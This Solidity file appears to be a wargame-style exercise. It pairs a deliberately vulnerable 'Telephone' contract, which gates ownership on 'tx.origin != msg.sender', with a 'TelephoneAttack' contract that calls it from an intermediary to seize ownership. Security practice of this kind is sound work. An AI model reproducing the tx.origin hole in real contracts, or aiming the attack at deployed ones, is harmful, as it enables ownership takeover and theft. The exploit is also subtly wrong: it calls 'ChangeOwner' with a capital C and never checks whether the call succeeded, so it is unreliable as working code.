// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}

contract TelephoneAttack {    
    constructor(address _telephone, address _addr) {
        (bool success, bytes memory err) = address(_telephone).call{value: 0}(
            abi.encodeWithSignature("ChangeOwner(address)", _addr)
        );
    }
}
